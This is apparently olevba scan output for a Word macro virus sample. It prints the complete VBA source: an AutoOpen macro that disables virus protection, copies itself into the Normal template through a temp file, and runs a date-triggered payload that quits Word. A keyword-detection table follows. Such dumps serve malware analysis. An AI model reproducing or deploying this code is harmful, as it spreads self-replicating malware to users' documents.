olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fn-9ef704a9b7c3c24c6fb598e184f8615d606c5b7e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fn-9ef704a9b7c3c24c6fb598e184f8615d606c5b7e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo 75

I = 0

Options.VirusProtection = False

Options.SaveNormalPrompt = False

Options.ConfirmConversions = False

If Day(13) And Month(11) Then Call ©

gx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

xg = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines

If xg > 94 And gx > 0 Then GoTo 75

If xg < 94 Then

 Set bg = NormalTemplate.VBProject.VBComponents.Item(1)

 ActiveDocument.VBProject.VBComponents.Item(1).Name = bg.Name

 ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\gerbil.sys"

End If

If gx = 0 Then Set bg = ActiveDocument.VBProject.VBComponents.Item(1)

 Infection = Int(Rnd * 50)

 If Infection = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(71) + Chr(69) + Chr(82) + Chr(66) + Chr(73) + Chr(76) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)

 bg.codemodule.AddFromFile ("c:\gerbil.sys")

 With bg.codemodule

    For x = 1 To 4

    .deletelines 1

    Next x

 End With
  
 If xg < 94 Then

    With bg.codemodule

    .replaceline 1, "Sub AutoClose()"

    .replaceline 99, "Sub ToolsMacro()"
       
    rd = Int(Rnd * 100)

If rd = 99 Then .replaceline 69, ".replaceline x, ""'"" & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow"
    
End With

 End If

 With bg.codemodule

    For x = 2 To 96 Step 2

    .replaceline x, "'" & Application.DisplayRecentFiles & Application.StartupPath & Application.ActiveDocument & Application.ActiveWindow

    Next x

 End With

75:

 If xg > 94 And gx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Private Sub ©()

Top:

I = I + 1

On Error Resume Next

Application.WindowState = wdWindowStateMinimize

Application.WindowState = wdWindowStateMaximize

If I < 10 Then GoTo Top

Application.Quit

End Sub

Sub ViewVBCode()

End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
